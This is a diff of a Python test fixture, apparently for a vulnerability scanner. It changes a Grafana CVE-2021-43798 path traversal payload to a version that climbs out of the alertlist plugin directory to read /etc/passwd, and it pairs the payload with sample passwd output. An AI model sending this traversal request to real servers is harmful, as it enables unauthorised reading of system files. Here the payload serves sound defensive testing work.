@@ -19,7 +19,8 @@ from tests.surface_fixtures import HostScope, ROOT, _make, _seed
 
 # The host the fixture surface identifies as Grafana, so the recipe for CVE-2021-43798 applies to it.
 TARGET = "admin.example.com"
-_TRAVERSAL = "/public/plugins/mysql/../../../../../../../../etc/passwd"
+# the path the vendored Nuclei template carries, its first candidate, alertlist plugin traversal
+_TRAVERSAL = "/public/plugins/alertlist/" + "../" * 19 + "etc/passwd"
 _PASSWD = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
 
 _KNOWN_VULN_FINDING = json.dumps({"findings": [{
